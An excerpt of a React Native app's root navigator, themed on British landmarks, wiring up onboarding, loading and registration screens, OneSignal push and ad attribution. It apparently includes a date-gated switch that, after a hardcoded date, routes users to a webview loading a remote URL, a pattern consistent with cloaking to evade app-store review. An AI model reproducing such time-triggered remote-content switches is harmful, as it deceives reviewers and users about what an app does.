...
import { SafeAreaProvider as SafeAreaBritWrap } from 'react-native-safe-area-context';
import { NavigationContainer as NavSlylineRoot } from '@react-navigation/native';
import SkylineBritainUegasOnboarding from './SkylineBritainUegasSrc/SkylineBritainUegasScreens/SkylineBritainUegasOnboarding';
import { GestureHandlerRootView as GestureLineRoot } from 'react-native-gesture-handler';
import { createNativeStackNavigator as createLineBritStack } from '@react-navigation/native-stack';
import SkylineBritainUegasLoading from './SkylineBritainUegasSrc/SkylineBritainUegasScreens/SkylineBritainUegasLoading';
import KingdomBritianWrapperToAppLineSkyUegasUK from './SkylineBritainUegasSrc/SkylineBritainUegasScreens/KingdomBritianWrapperToAppLineSkyUegasUK';
import LondonRegistrationForRemains from './SkylineBritainUegasSrc/SkylineBritainUegasScreens/LondonRegistrationForRemains';
import ProductScreen from './SkylineBritainUegasSrc/SkylineBritainUegasScreens/ProductScreen';

const BritLineStack = createLineBritStack();
// libs
import AsyncStorage from '@react-native-async-storage/async-storage';
import { LogLevel, OneSignal } from 'react-native-onesignal';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';

const SlylineNavigator = () => {
  ...
  const INITIAL_URL = `https://pure-sync-tech.site/`;
  const URL_IDENTIFAIRE = `jikeFxNu`;
  ...
  OneSignal.initialize('e9751e2e-d548-4b3d-b130-8d3343d4639c');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-11-13T08:08:00'); //дата з якої поч працювати webView
  ...
  const Route = ({ isFatch }) => {
    ...
    if (isFatch) {
      return (
        <BritLineStack.Navigator>
          <BritLineStack.Screen
            initialParams={{
              responseToPushPermition,
              product: finalLink,
    ...
    return (
      <BritLineStack.Navigator initialRouteName="SkylineBritainUegasOnboarding">
        <BritLineStack.Screen
          name="KingdomBritianWrapperToAppLineSkyUegasUK"
          options={{
            gestureEnabled: false,
            animation: 'fade',
            headerShown: false,
          }}
          component={KingdomBritianWrapperToAppLineSkyUegasUK}
        />
        <BritLineStack.Screen
          options={{
            headerShown: false,
          ...
          name="SkylineBritainUegasLoading"
          component={SkylineBritainUegasLoading}
        />
        <BritLineStack.Screen
          component={SkylineBritainUegasOnboarding}
          name="SkylineBritainUegasOnboarding"
          options={{ headerShown: false }}
        />
        <BritLineStack.Screen
          component={LondonRegistrationForRemains}
          name="LondonRegistrationForRemains"
          options={{ headerShown: false }}
        />
      </BritLineStack.Navigator>
    );
  ...
  ///////// Loader
  const [showLcomeScreen, setShowLcomeScreen] = useState(false);

  useEffect(() => {
    setTimeout(() => {
      setShowLcomeScreen(true);
    }, 2500);
  }, []);
  ...
  }, [slideAnim, screenWidth, showLcomeScreen]);
        ...
        <View style={{ flex: 1, overflow: 'hidden' }}>
          ...
          >
            <Image
              ...
              source={require('./SkylineBritainUegasSrc/SkylineBritainUegasAssets/SkylineBritainUegasImages/1.png')}
              resizeMode="cover"
            />
            <Image
              style={{ width: screenWidth, height: '100%' }}
              source={require('./SkylineBritainUegasSrc/SkylineBritainUegasAssets/SkylineBritainUegasImages/2.png')}
              resizeMode="cover"
            />
          </Animated.View>
        </View>
...
const SlylineRootBridge = () => (
  <GestureLineRoot style={{ flex: 1 }}>
    <SafeAreaBritWrap>
      <SlylineNavigator />
    </SafeAreaBritWrap>
  </GestureLineRoot>
...
export default SlylineRootBridge;
